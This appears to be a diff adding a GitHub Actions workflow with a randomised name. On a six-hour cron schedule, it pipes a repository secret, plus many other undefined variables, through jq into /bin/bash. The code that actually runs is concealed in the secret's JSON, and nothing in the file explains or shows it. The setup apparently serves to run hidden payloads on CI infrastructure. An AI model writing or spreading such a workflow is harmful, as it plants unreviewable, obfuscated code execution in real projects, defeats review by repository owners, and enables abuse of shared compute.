@@ -1,0 +1,31 @@
+name: bielebantiann
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: bielebantiann
+        env:
+          wf86: ${{ secrets.wf86 }}
+        run: |
+          echo $wf86 | jq -r .g627 | /bin/bash
+          echo $hhby0867 | jq -r .ki339 | /bin/bash
+          echo $b8 | jq -r .mfcf8855 | /bin/bash
+          echo $gc533 | jq -r .f415 | /bin/bash
+          echo $rp8128 | jq -r .yhiz645 | /bin/bash
+          echo $hprg53 | jq -r .ae60 | /bin/bash
+          echo $sgvbp9791 | jq -r .jufvv6218 | /bin/bash
+          echo $jmh6 | jq -r .wkddl70 | /bin/bash
+          echo $j38 | jq -r .pl7 | /bin/bash
+          echo $nco98 | jq -r .jld3 | /bin/bash
+          echo $k48098 | jq -r .jle70607 | /bin/bash
+          echo $grcnr521 | jq -r .niok655 | /bin/bash
+          echo $bblzx21696 | jq -r .f415 | /bin/bash
+
